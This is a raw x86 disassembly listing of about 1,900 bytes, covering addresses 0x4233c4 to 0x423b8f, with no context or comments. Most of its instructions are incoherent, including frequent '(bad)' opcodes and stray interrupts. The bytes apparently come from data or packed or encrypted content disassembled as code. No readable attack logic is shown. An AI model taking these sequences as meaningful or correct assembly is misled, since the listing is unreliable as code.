  4233c4:	leave  
  4233c5:	jbe    0x423364
  4233c7:	inc    ecx
  4233c8:	and    DWORD PTR [esi+0x4576cd35],eax
  4233ce:	int    0x8d
  4233d0:	inc    ebp
  4233d1:	cmp    eax,ebp
  4233d3:	cmp    ecx,DWORD PTR [edi]
  4233d5:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233db:	push   ebx
  4233dc:	ror    DWORD PTR [edx],cl
  4233de:	jbe    0x423435
  4233e0:	int    0x76
  4233e2:	inc    ebp
  4233e3:	int    0x8d
  4233e5:	inc    ebp
  4233e6:	cmp    eax,ebp
  4233e8:	cmp    ecx,DWORD PTR [edi]
  4233ea:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233f0:	push   ebx
  4233f1:	ror    DWORD PTR [edx],cl
  4233f3:	jbe    0x42338a
  4233f5:	leave  
  4233f6:	jbe    0x423435
  4233f8:	dec    eax
  4233f9:	and    DWORD PTR [esi+0x1d76c935],eax
  4233ff:	ret    0x8621
  423402:	xor    eax,0xcd4576cd
  423407:	lea    eax,[ebp+0x3b]
  42340a:	lds    edi,FWORD PTR [ebx]
  42340c:	psrlq  mm6,mm2
  42340f:	sub    bl,dl
  423411:	mov    ebp,0xcdd35392
  423416:	lea    ebp,[ebp+0x52f7d43]
  42341c:	push   ss
  42341d:	xchg   DWORD PTR [eax-0x6d241480],eax
  423423:	add    BYTE PTR [eax-0x32c27233],0x76
  42342a:	cmp    eax,0x3b5596cd
  42342f:	jns    0x42346c
  423431:	or     al,0xd3
  423433:	lods   eax,DWORD PTR ds:[esi]
  423434:	sub    bl,dl
  423436:	jmp    0x4233ca
  423438:	push   ebx
  423439:	jge    0x423408
  42343b:	jbe    0x4233ea
  42343d:	xor    edx,edx
  42343f:	cmp    ebx,edx
  423441:	clc    
  423442:	add    cl,BYTE PTR [edx]
  423444:	jbe    0x4233db
  423446:	int    0x76
  423448:	sbb    eax,0x3b1d8dcd
  42344d:	lds    edi,FWORD PTR [ebx]
  42344f:	psrlq  mm6,mm2
  423452:	sub    bl,dl
  423454:	mov    ebp,0xcdd35392
  423459:	lea    edx,[ebp+0x16d87d43]
  42345f:	int    0x76
  423461:	sbb    eax,0x3b1d8dcd
  423466:	lds    edi,FWORD PTR [ebx]
  423468:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  42346f:	push   ebx
  423470:	ror    DWORD PTR [edx],cl
  423472:	jbe    0x423409
  423474:	int    0x76
  423476:	cmp    eax,0x3b3d8dcd
  42347b:	lds    edi,FWORD PTR [ebx]
  42347d:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423484:	push   ebx
  423485:	ror    ebp,cl
  423487:	lea    edx,[ebp+0xad3d12f]
  42348d:	jbe    0x423424
  42348f:	int    0x76
  423491:	inc    ebp
  423492:	int    0x8d
  423494:	inc    ebp
  423495:	cmp    eax,ebp
  423497:	cmp    ecx,DWORD PTR [edi]
  423499:	shl    edx,cl
  42349b:	sub    bl,dl
  42349d:	mov    ebp,0xcdd35392
  4234a2:	lea    edx,[ebp+0x52f7d43]
  4234a8:	pusha  
  4234a9:	xchg   edx,eax
  4234aa:	add    BYTE PTR [eax+0xa9576cd],0x76
  4234b1:	or     eax,0x875576cd
  4234b6:	jbe    0x423488
  4234b8:	or     ah,dh
  4234ba:	xchg   ebp,eax
  4234bb:	or     dh,BYTE PTR [esi+0x6d]
  4234be:	pop    ebp
  4234bf:	inc    ecx
  4234c0:	and    DWORD PTR [esi+0x5d760a35],eax
  4234c6:	leave  
  4234c7:	jbe    0x4234de
  4234c9:	cmp    DWORD PTR [ecx],esp
  4234cb:	xchg   BYTE PTR ds:0xb23576c9,dh
  4234d1:	and    DWORD PTR [esi-0xe89f5cb],eax
  4234d7:	int    0x76
  4234d9:	xchg   ebp,eax
  4234da:	int    0x8d
  4234dc:	xchg   ebp,eax
  4234dd:	cmp    eax,ebp
  4234df:	cmp    ecx,DWORD PTR [edi]
  4234e1:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234e7:	push   ebx
  4234e8:	ror    DWORD PTR [edx],cl
  4234ea:	jbe    0x423569
  4234ec:	int    0x6d
  4234ee:	jmp    0x4234f6
  4234f0:	add    DWORD PTR [eax-0x36923280],0x7006
  4234fa:	add    BYTE PTR [ebx],cl
  4234fc:	and    DWORD PTR [esi-0x369232cb],eax
  423502:	push   es
  423503:	xchg   esp,eax
  423504:	add    BYTE PTR [eax],al
  423506:	add    bh,dh
  423508:	and    DWORD PTR [esi-0x329232cb],eax
  42350e:	ins    DWORD PTR es:[edi],dx
  42350f:	int    0x76
  423511:	icebp  
  423512:	int    0x8d
  423514:	icebp  
  423515:	cmp    eax,ebp
  423517:	cmp    ecx,DWORD PTR [edi]
  423519:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42351f:	push   ebx
  423520:	ror    ebp,cl
  423522:	lea    edi,[ebp+0x2f]
  423525:	rcl    ebx,1
  423527:	int    0x8d
  423529:	ins    DWORD PTR es:[edi],dx
  42352a:	retf   0x8884
  42352d:	or     DWORD PTR [esi-0x57],esi
  423530:	int    0x6d
  423532:	int    0x76
  423534:	icebp  
  423535:	int    0x8d
  423537:	icebp  
  423538:	cmp    ecx,DWORD PTR [edi]
  42353a:	cmp    eax,ebp
  42353c:	shl    edx,cl
  42353e:	sub    bl,dl
  423540:	mov    ebp,0xcdd35392
  423545:	lea    edi,[ebp+0x2f]
  423548:	rcl    ebx,1
  42354a:	int    0x8d
  42354c:	adc    eax,0x3b1596cd
  423551:	or     al,0x3b
  423553:	cdq    
  423554:	shr    ebx,cl
  423556:	xchg   edx,eax
  423557:	shr    edx,cl
  423559:	sub    BYTE PTR [ebx+0x13],dl
  42355c:	xchg   ebx,edx
  42355e:	int    0x8d
  423560:	ins    DWORD PTR es:[edi],dx
  423561:	das    
  423562:	pop    ecx
  423563:	dec    esp
  423564:	mov    ch,cl
  423566:	push   es
  423567:	jo     0x423569
  423569:	add    BYTE PTR [eax],al
  42356b:	int    0x17
  42356d:	jo     0x42356f
  42356f:	add    BYTE PTR [eax],al
  423571:	cmp    eax,ebp
  423573:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  423579:	jmp    0x2fd3:0x87d25328
  423580:	pop    ecx
  423581:	lea    ebp,[ecx-0x72f682c5]
  423587:	test   eax,0x76ca6dcd
  42358c:	test   eax,0xcdf18dcd
  423591:	xchg   esi,eax
  423592:	icebp  
  423593:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423596:	cdq    
  423597:	shr    edx,cl
  423599:	sub    bl,dl
  42359b:	jmp    0x42352f
  42359d:	push   ebx
  42359e:	adc    ecx,ebp
  4235a0:	xchg   esi,eax
  4235a1:	jge    0x4235d2
  4235a3:	rcl    DWORD PTR [ebx],1
  4235a5:	int    0x96
  4235a7:	ins    DWORD PTR es:[edi],dx
  4235a8:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  4235af:	icebp  
  4235b0:	int    0x8d
  4235b2:	icebp  
  4235b3:	cmp    eax,ebp
  4235b5:	cmp    ecx,DWORD PTR [edi]
  4235b7:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4235bd:	push   ebx
  4235be:	ror    ebp,cl
  4235c0:	lea    edi,[ebp+0x2f]
  4235c3:	rcl    ebx,1
  4235c5:	int    0x8d
  4235c7:	ins    DWORD PTR es:[edi],dx
  4235c8:	retf   0x8884
  4235cb:	or     DWORD PTR [esi-0x57],esi
  4235ce:	int    0x6d
  4235d0:	int    0x76
  4235d2:	icebp  
  4235d3:	int    0x8d
  4235d5:	icebp  
  4235d6:	cmp    eax,ebp
  4235d8:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4235de:	repnz sub BYTE PTR [ebx-0x2d],dl
  4235e2:	int    0x8d
  4235e4:	jge    0x423615
  4235e6:	rcl    ebx,1
  4235e8:	int    0x8d
  4235ea:	pop    ebp
  4235eb:	int    0x96
  4235ed:	pop    ebp
  4235ee:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235f1:	cdq    
  4235f2:	shr    ebx,cl
  4235f4:	xchg   edx,eax
  4235f5:	shr    edx,cl
  4235f7:	sub    BYTE PTR [ebx+0x13],dl
  4235fa:	xchg   ebx,edx
  4235fc:	int    0x8d
  4235fe:	ins    DWORD PTR es:[edi],dx
  4235ff:	das    
  423600:	pop    ecx
  423601:	dec    esp
  423602:	mov    ch,cl
  423604:	push   es
  423605:	xchg   esp,eax
  423606:	add    BYTE PTR [eax],al
  423608:	add    ch,cl
  42360a:	pop    ss
  42360b:	xchg   esp,eax
  42360c:	add    BYTE PTR [eax],al
  42360e:	add    BYTE PTR [ebx],bh
  423610:	lds    edi,FWORD PTR [ebx]
  423612:	cdq    
  423613:	sar    DWORD PTR [ebp+0x28ead392],cl
  423619:	push   ebx
  42361a:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423620:	test   eax,0x8d097d3b
  423625:	test   eax,0x76ca6dcd
  42362a:	test   eax,0xcdf18dcd
  42362f:	xchg   esi,eax
  423630:	icebp  
  423631:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423634:	cdq    
  423635:	shr    edx,cl
  423637:	sub    bl,dl
  423639:	jmp    0x4235cd
  42363b:	push   ebx
  42363c:	adc    ecx,ebp
  42363e:	xchg   esi,eax
  42363f:	jge    0x423670
  423641:	rcl    DWORD PTR [ebx],1
  423643:	int    0x96
  423645:	ins    DWORD PTR es:[edi],dx
  423646:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42364d:	xor    eax,0x3b358dcd
  423652:	(bad)  
  423654:	(bad)
  423657:	sub    bl,dl
  423659:	mov    ebp,0xcdd35392
  42365e:	lea    ebx,[ebp-0x33]
  423661:	xchg   esi,eax
  423662:	pop    ebp
  423663:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423666:	cdq    
  423667:	shr    ebx,cl
  423669:	xchg   edx,eax
  42366a:	shr    edx,cl
  42366c:	sub    BYTE PTR [ebx+0x13],dl
  42366f:	das    
  423670:	rcl    ebx,1
  423672:	xchg   DWORD PTR [esi+0x7d],esi
  423675:	or     dh,BYTE PTR [esi+0x7d]
  423678:	int    0x76
  42367a:	jge    0x423649
  42367c:	lea    ecx,ds:0xb2f7d43
  423682:	(bad)  
  423683:	inc    DWORD PTR [eax]
  423685:	add    ch,cl
  423687:	jbe    0x4236e6
  423689:	int    0x8d
  42368b:	pop    ebp
  42368c:	cmp    ecx,DWORD PTR [edi]
  42368e:	shl    edx,cl
  423690:	sub    BYTE PTR [ebx],bh
  423692:	(bad)
  423695:	xchg   edx,eax
  423696:	push   ebx
  423697:	ror    ebp,cl
  423699:	lea    ecx,ds:0xcdd3d12f
  42369f:	lea    edx,[ebp-0x142cf3c5]
  4236a5:	xchg   edx,eax
  4236a6:	push   ebx
  4236a7:	ror    ebp,cl
  4236a9:	lea    edx,[ebp-0xd2cf0c5]
  4236af:	sub    BYTE PTR [ebx-0x2d],dl
  4236b2:	or     dh,BYTE PTR [esi+0x35]
  4236b5:	int    0x76
  4236b7:	popf   
  4236b8:	int    0x8d
  4236ba:	popf   
  4236bb:	cmp    ecx,DWORD PTR [edi]
  4236bd:	shl    edx,cl
  4236bf:	sub    BYTE PTR [ebx],bh
  4236c1:	(bad)
  4236c4:	xchg   edx,eax
  4236c5:	push   ebx
  4236c6:	ror    ebp,cl
  4236c8:	lea    ebx,[ebp+0x3b9d96cd]
  4236ce:	or     al,0xd3
  4236d0:	jmp    0x423664
  4236d2:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4236d8:	adc    eax,DWORD PTR [edi+0x7d87358d]
  4236de:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  4236e4:	in     al,dx
  4236e5:	sbb    al,0xcd
  4236e7:	jbe    0x423686
  4236e9:	int    0x8d
  4236eb:	popf   
  4236ec:	cmp    eax,ebp
  4236ee:	cmp    ecx,DWORD PTR [edi]
  4236f0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4236f6:	push   ebx
  4236f7:	rol    DWORD PTR [edi+0x760a5576],cl
  4236fd:	push   ebp
  4236fe:	int    0x76
  423700:	popf   
  423701:	int    0x8d
  423703:	popf   
  423704:	cmp    eax,ebp
  423706:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42370c:	repnz sub BYTE PTR [ebx-0x2d],dl
  423710:	int    0x8d
  423712:	lods   eax,DWORD PTR ds:[esi]
  423713:	xor    edi,DWORD PTR [ebp-0x33]
  423716:	jbe    0x4236b5
  423718:	int    0x96
  42371a:	popf   
  42371b:	cmp    eax,ebp
  42371d:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  423723:	mov    ebp,0xcdd25392
  423728:	xchg   esi,eax
  423729:	push   ebp
  42372a:	das    
  42372b:	rcl    edx,1
  42372d:	inc    ebx
  42372e:	shr    DWORD PTR [edi],cl
  423730:	pop    es
  423731:	adc    ebp,edi
  423733:	add    BYTE PTR [eax],al
  423735:	int    0x76
  423737:	stc    
  423738:	int    0x76
  42373a:	stc    
  42373b:	int    0x76
  42373d:	std    
  42373e:	or     dh,BYTE PTR [esi+0x35]
  423741:	int    0x76
  423743:	mov    ch,cl
  423745:	lea    esp,ds:0x3b2596cd
  42374b:	or     al,0xd3
  42374d:	jmp    0x4236e1
  42374f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423755:	add    BYTE PTR [eax+0x5328ead3],0x13
  42375c:	jno    0x42372b
  42375e:	lea    esp,[ebp-0x33]
  423761:	xchg   esi,eax
  423762:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423766:	cdq    
  423767:	shr    ebx,cl
  423769:	xchg   edx,eax
  42376a:	shr    edx,cl
  42376c:	sub    BYTE PTR [ebx+0x13],dl
  42376f:	jno    0x42373e
  423771:	(bad)  
  423772:	stc    
  423773:	int    0x96
  423775:	stc    
  423776:	add    dh,dl
  423778:	xor    eax,0x993b0c3b
  42377d:	shr    ebx,cl
  42377f:	xchg   edx,eax
  423780:	shr    edx,cl
  423782:	sub    BYTE PTR [ebx+0x13],dl
  423785:	jno    0x423787
  423787:	jo     0x42379d
  423789:	int    0x8d
  42378b:	stc    
  42378c:	int    0x96
  42378e:	stc    
  42378f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423792:	cdq    
  423793:	shr    ebx,cl
  423795:	xchg   edx,eax
  423796:	shr    edx,cl
  423798:	sub    BYTE PTR [ebx+0x13],dl
  42379b:	or     dh,BYTE PTR [esi+0x65]
  42379e:	inc    ebx
  42379f:	jge    0x4237d0
  4237a1:	add    eax,0x808080ab
  4237a6:	int    0x76
  4237a8:	stc    
  4237a9:	in     al,dx
  4237aa:	(bad)  
  4237ab:	int    0x96
  4237ad:	or     dh,BYTE PTR gs:[esi-0x53]
  4237b1:	push   ecx
  4237b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237b3:	lods   eax,DWORD PTR ds:[esi]
  4237b4:	int    0x8d
  4237b6:	lods   eax,DWORD PTR ds:[esi]
  4237b7:	shr    ebx,cl
  4237b9:	xchg   edx,eax
  4237ba:	cmp    edi,DWORD PTR [ecx-0x2d]
  4237bd:	lods   eax,DWORD PTR ds:[esi]
  4237be:	sub    BYTE PTR [ebx-0x2d],dl
  4237c1:	int    0x8d
  4237c3:	jne    0x42378f
  4237c5:	dec    esp
  4237c6:	or     DWORD PTR [ecx],0x8dcd304c
  4237cc:	mov    ch,0xcd
  4237ce:	lea    esi,[ebp+0x3bb596cd]
  4237d4:	or     al,0x3b
  4237d6:	cdq    
  4237d7:	shr    edx,cl
  4237d9:	sub    bl,dl
  4237db:	jmp    0x42376f
  4237dd:	push   ebx
  4237de:	adc    ecx,ebp
  4237e0:	xchg   esi,eax
  4237e1:	mov    ch,0x87
  4237e3:	jge    0x4237b2
  4237e5:	jbe    0x423794
  4237e7:	cmp    edx,ebp
  4237e9:	add    al,0xad
  4237eb:	std    
  4237ec:	add    al,0xea
  4237ee:	std    
  4237ef:	shr    ebx,cl
  4237f1:	sub    BYTE PTR [edi+0x3bd353d2],al
  4237f7:	leave  
  4237f8:	int    0x8d
  4237fa:	std    
  4237fb:	int    0x96
  4237fd:	std    
  4237fe:	shr    edx,cl
  423800:	xchg   edx,eax
  423801:	shr    ebx,cl
  423803:	sub    BYTE PTR [ebx-0x1d],dl
  423806:	cmp    ebx,ecx
  423808:	inc    ebx
  423809:	rcl    dh,cl
  42380b:	mov    ds:0xcd8876cd,eax
  423810:	lea    ebp,ds:0xcd2d96cd
  423816:	add    DWORD PTR [ecx],edx
  423818:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423822:	shr    edx,cl
  423824:	sub    BYTE PTR [ebx+0x13],dl
  423827:	jno    0x4237f6
  423829:	(bad)  
  42382a:	stc    
  42382b:	int    0x96
  42382d:	stc    
  42382e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423831:	cdq    
  423832:	shr    ebx,cl
  423834:	xchg   edx,eax
  423835:	shr    edx,cl
  423837:	sub    BYTE PTR [ebx+0x13],dl
  42383a:	jno    0x42383c
  42383c:	(bad)  
  42383d:	jne    0x42383f
  42383f:	jo     0x42385d
  423841:	int    0x76
  423843:	or     dh,BYTE PTR gs:[esi+0x75]
  423847:	int    0x76
  423849:	xor    eax,0xcdfd760a
  42384e:	jbe    0x42384d
  423850:	cmp    ecx,ebx
  423852:	add    al,0xbd
  423854:	test   ah,dl
  423856:	xor    ecx,ebp
  423858:	jbe    0x4238cf
  42385a:	int    0x14
  42385c:	mov    ch,cl
  42385e:	jbe    0x4238d5
  423860:	int    0x84
  423862:	mov    BYTE PTR [ebx],bh
  423864:	jns    0x4238a1
  423866:	aad    0xd3
  423868:	lods   eax,DWORD PTR ds:[esi]
  423869:	sub    bl,dl
  42386b:	repz xchg edx,eax
  42386d:	push   ebx
  42386e:	ror    ch,cl
  423870:	xchg   esi,eax
  423871:	jne    0x42387d
  423873:	test   BYTE PTR [edx-0x33],cl
  423876:	jbe    0x423875
  423878:	add    al,0xd3
  42387a:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423881:	xlat   BYTE PTR ds:[ebx]
  423882:	int    0x76
  423884:	std    
  423885:	cmp    ecx,ebx
  423887:	add    al,0xbd
  423889:	test   ah,dl
  42388b:	xor    ecx,ebp
  42388d:	jbe    0x423904
  42388f:	int    0x14
  423891:	mov    ch,cl
  423893:	jbe    0x42390a
  423895:	int    0x84
  423897:	mov    BYTE PTR [ebx],bh
  423899:	jns    0x4238d6
  42389b:	aad    0xd3
  42389d:	lods   eax,DWORD PTR ds:[esi]
  42389e:	sub    bl,dl
  4238a0:	repz xchg edx,eax
  4238a2:	push   ebx
  4238a3:	ror    ch,cl
  4238a5:	xchg   esi,eax
  4238a6:	jne    0x4238b2
  4238a8:	test   BYTE PTR [edx-0x33],cl
  4238ab:	jbe    0x4238aa
  4238ad:	add    al,0xd3
  4238af:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  4238b6:	xlat   BYTE PTR ds:[ebx]
  4238b7:	int    0x76
  4238b9:	jne    0x4238c5
  4238bb:	jbe    0x4238ca
  4238bd:	int    0x76
  4238bf:	mov    ch,0xcd
  4238c1:	lea    esi,[ebp+0xf3bc53b]
  4238c7:	shl    edx,cl
  4238c9:	sub    bl,dl
  4238cb:	mov    ebp,0xcdd35392
  4238d0:	(bad)  
  4238d1:	stc    
  4238d2:	or     dh,BYTE PTR [esi+0x25]
  4238d5:	leave  
  4238d6:	jbe    0x4238a4
  4238d8:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  4238df:	imul   edx,ebp,0x8d0a0c69
  4238e5:	gs adc bh,dl
  4238e8:	into   
  4238e9:	and    DWORD PTR [esi-0x32fad0cb],eax
  4238ef:	add    BYTE PTR [eax+0xd96cd80],0xcd
  4238f6:	sar    DWORD PTR [ebx],cl
  4238f8:	lds    ecx,FWORD PTR [edx]
  4238fa:	jbe    0x4238a9
  4238fc:	rol    esi,cl
  4238fe:	lods   eax,DWORD PTR ds:[esi]
  4238ff:	xchg   edx,eax
  423900:	or     dh,BYTE PTR [esi-0x30]
  423903:	int    0xd3
  423905:	cmp    edi,DWORD PTR [ecx-0x2d]
  423908:	lods   eax,DWORD PTR ds:[esi]
  423909:	sub    BYTE PTR [ebx+0x76],dl
  42390c:	lods   eax,DWORD PTR ds:[esi]
  42390d:	retf   0x858c
  423910:	int3   
  423911:	das    
  423912:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  42391d:	retf   
  42391e:	inc    ebx
  42391f:	rcl    esi,cl
  423921:	jle    0x4238f0
  423923:	jbe    0x4238da
  423925:	int    0x8d
  423927:	mov    ch,0xcd
  423929:	jbe    0x4238e0
  42392b:	int    0x96
  42392d:	mov    ch,0x3b
  42392f:	jns    0x42396c
  423931:	or     al,0xd3
  423933:	lods   eax,DWORD PTR ds:[esi]
  423934:	sub    bl,dl
  423936:	jmp    0x4238ca
  423938:	push   ebx
  423939:	jge    0x423908
  42393b:	jbe    0x4239a2
  42393d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423940:	lods   eax,DWORD PTR ds:[esi]
  423941:	sub    BYTE PTR [ebx+0x76],dl
  423944:	lods   eax,DWORD PTR ds:[esi]
  423945:	cmp    edx,ebp
  423947:	xchg   DWORD PTR [ebp-0x33],edi
  42394a:	jbe    0x42391c
  42394c:	add    al,0xea
  42394e:	std    
  42394f:	add    al,0xad
  423951:	std    
  423952:	shr    ebx,cl
  423954:	sub    BYTE PTR [edi+0x3b1353f1],al
  42395a:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  423961:	and    DWORD PTR [esi-0x323329cb],eax
  423967:	jbe    0x42398e
  423969:	in     al,dx
  42396a:	and    cl,ch
  42396c:	jbe    0x423967
  42396e:	int    0x8d
  423970:	stc    
  423971:	cmp    eax,ebp
  423973:	cmp    ecx,DWORD PTR [edi]
  423975:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42397b:	push   ebx
  42397c:	ror    ebp,cl
  42397e:	(bad)  
  42397f:	stc    
  423980:	int    0x96
  423982:	stc    
  423983:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423986:	cdq    
  423987:	shr    ebx,cl
  423989:	xchg   edx,eax
  42398a:	shr    edx,cl
  42398c:	sub    BYTE PTR [ebx+0x13],dl
  42398f:	inc    ebx
  423990:	jge    0x4239c1
  423992:	add    eax,0x80809223
  423997:	int    0x76
  423999:	or     eax,0xa886ccd
  42399e:	out    0xb5,al
  4239a0:	leave  
  4239a1:	jbe    0x4239c8
  4239a3:	mov    dl,0x21
  4239a5:	xchg   BYTE PTR ds:0x393576c9,dh
  4239ab:	and    DWORD PTR [esi-0x6a8936cb],eax
  4239b1:	dec    ecx
  4239b2:	mov    al,ds:0x76c93586
  4239b7:	lods   eax,DWORD PTR ds:[esi]
  4239b8:	imul   esp,DWORD PTR [ecx],0x76c93586
  4239be:	and    ch,BYTE PTR gs:[ebx-0x7a]
  4239c2:	xor    eax,0xcd3d760a
  4239c7:	jbe    0x423951
  4239c9:	int    0x8d
  4239cb:	lods   eax,DWORD PTR ds:[esi]
  4239cc:	int    0x96
  4239ce:	lods   eax,DWORD PTR ds:[esi]
  4239cf:	cmp    ecx,DWORD PTR [ebx+edx*8]
  4239d2:	jmp    0x423966
  4239d4:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4239da:	adc    esi,DWORD PTR [ecx-0x33]
  4239dd:	lea    edx,[ebp+0x3b9596cd]
  4239e3:	or     al,0xd3
  4239e5:	jmp    0x423979
  4239e7:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239ed:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239f4:	jno    0x4239c3
  4239f6:	lea    esp,[ebp-0x33]
  4239f9:	xchg   esi,eax
  4239fa:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  4239fe:	cdq    
  4239ff:	shr    ebx,cl
  423a01:	xchg   edx,eax
  423a02:	shr    edx,cl
  423a04:	sub    BYTE PTR [ebx+0x13],dl
  423a07:	jno    0x4239d6
  423a09:	lea    esi,[ebp+0x3bb596cd]
  423a0f:	or     al,0x3b
  423a11:	cdq    
  423a12:	shr    ebx,cl
  423a14:	xchg   edx,eax
  423a15:	shr    edx,cl
  423a17:	sub    BYTE PTR [ebx+0x13],dl
  423a1a:	jno    0x423a1c
  423a1c:	jo     0x423a32
  423a1e:	or     dh,BYTE PTR [esi+0x65]
  423a21:	int    0x76
  423a23:	mov    ch,cl
  423a25:	lea    ebp,[ebp+0x3bad96cd]
  423a2b:	or     al,0xd3
  423a2d:	jmp    0x4239c1
  423a2f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423a35:	add    BYTE PTR [eax+0x5328ead3],0x13
  423a3c:	jno    0x423a0b
  423a3e:	lea    edx,[ebp+0x3b9596cd]
  423a44:	or     al,0x3b
  423a46:	cdq    
  423a47:	shr    ebx,cl
  423a49:	xchg   edx,eax
  423a4a:	shr    edx,cl
  423a4c:	sub    BYTE PTR [ebx+0x13],dl
  423a4f:	jno    0x423a1e
  423a51:	lea    esi,[ebp+0xb596cd]
  423a57:	(bad)  
  423a58:	cmp    eax,0x993b0c3b
  423a5d:	shr    ebx,cl
  423a5f:	xchg   edx,eax
  423a60:	shr    edx,cl
  423a62:	sub    BYTE PTR [ebx+0x13],dl
  423a65:	jno    0x423a67
  423a67:	jo     0x423a7d
  423a69:	int    0x8d
  423a6b:	mov    ch,0xa
  423a6d:	jbe    0x423a1c
  423a6f:	int    0x76
  423a71:	mov    ch,0x3b
  423a73:	or     al,0x3b
  423a75:	jns    0x423a4a
  423a77:	jmp    0x423a0b
  423a79:	shr    DWORD PTR [ebp-0x3282acd8],cl
  423a7f:	jbe    0x423ae6
  423a81:	inc    ebx
  423a82:	jge    0x423ab3
  423a84:	add    eax,0x8080853c
  423a89:	int    0x8d
  423a8b:	mov    ch,0xcd
  423a8d:	xchg   esi,eax
  423a8e:	mov    ch,0x3b
  423a90:	or     al,0x3b
  423a92:	cdq    
  423a93:	shr    ebx,cl
  423a95:	xchg   edx,eax
  423a96:	shr    edx,cl
  423a98:	sub    BYTE PTR [ebx+0x13],dl
  423a9b:	inc    ebx
  423a9c:	lea    ebp,[ebp-0x7ab2fad1]
  423aa2:	add    BYTE PTR [eax-0x32da7233],0x8d
  423aa9:	and    eax,0x192ebd3
  423aae:	add    ch,BYTE PTR [edi-0x723277f7]
  423ab4:	mov    ch,0xcd
  423ab6:	lea    esi,[ebp+0x192ebd3]
  423abc:	add    ch,BYTE PTR [edi-0x327e83f7]
  423ac2:	lea    esi,ds:0xd3358dcd
  423ac8:	jmp    0x423a5c
  423aca:	add    DWORD PTR [edx],eax
  423acc:	scas   eax,DWORD PTR es:[edi]
  423acd:	or     DWORD PTR [edx+edx*4+0x4],edi
  423ad1:	aaa    
  423ad2:	sbb    al,0x0
  423ad4:	add    BYTE PTR [eax],al
  423ad6:	add    BYTE PTR [edi+esi*1],0x24
  423ada:	add    BYTE PTR [eax],al
  423adc:	add    BYTE PTR [eax+0x24cfcf],al
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	jno    0x423ae6
  423ae6:	(bad)  
  423ae7:	cmp    eax,0x1ccfcf
  423aec:	add    BYTE PTR [eax],al
  423aee:	add    dh,dl
  423af0:	lods   eax,DWORD PTR ds:[esi]
  423af1:	jno    0x423ac0
  423af3:	lea    ecx,ds:0xcd4c9100
  423af9:	lea    esi,[ebp+0x4]
  423afc:	shl    DWORD PTR [eax],cl
  423afe:	jno    0x423b70
  423b00:	mov    ebp,0xefef
  423b05:	or     dh,BYTE PTR [esi-0x30]
  423b08:	int    0x76
  423b0a:	mov    ch,cl
  423b0c:	lea    ebp,ds:0xcd2d96cd
  423b12:	add    DWORD PTR [ecx],edx
  423b14:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423b1e:	shr    edx,cl
  423b20:	sub    BYTE PTR [ebx+0x13],dl
  423b23:	jno    0x423af2
  423b25:	lea    esi,[ebp+0x3bb596cd]
  423b2b:	or     al,0x3b
  423b2d:	cdq    
  423b2e:	shr    ebx,cl
  423b30:	xchg   edx,eax
  423b31:	shr    edx,cl
  423b33:	sub    BYTE PTR [ebx+0x13],dl
  423b36:	jno    0x423b38
  423b38:	(bad)  
  423b39:	add    BYTE PTR gs:[eax+0x1c],dh
  423b3d:	int    0x76
  423b3f:	rcl    bl,1
  423b41:	ins    DWORD PTR es:[edi],dx
  423b42:	xchg   edx,eax
  423b43:	cmp    ecx,ecx
  423b45:	inc    ebx
  423b46:	leave  
  423b47:	int    0x76
  423b49:	mov    ch,cl
  423b4b:	lea    ebp,ds:0x811101cd
  423b51:	add    BYTE PTR [eax-0x29d26933],0x54
  423b58:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423b5b:	cdq    
  423b5c:	shr    ebx,cl
  423b5e:	xchg   edx,eax
  423b5f:	shr    edx,cl
  423b61:	sub    BYTE PTR [ebx+0x13],dl
  423b64:	jno    0x423b33
  423b66:	lea    esi,[ebp+0x3bb596cd]
  423b6c:	or     al,0x3b
  423b6e:	cdq    
  423b6f:	shr    ebx,cl
  423b71:	xchg   edx,eax
  423b72:	shr    edx,cl
  423b74:	sub    BYTE PTR [ebx+0x13],dl
  423b77:	jno    0x423b79
  423b79:	(bad)  
  423b7a:	jne    0x423b7c
  423b7c:	jo     0x423b9a
  423b7e:	int    0x76
  423b80:	lods   eax,DWORD PTR ds:[esi]
  423b81:	or     dh,BYTE PTR [esi+0x75]
  423b84:	int    0x76
  423b86:	cmp    eax,0xecfd760a
  423b8b:	cmp    BYTE PTR [ebx],bh
  423b8d:	or     al,0x3b
  423b8f:	cdq    
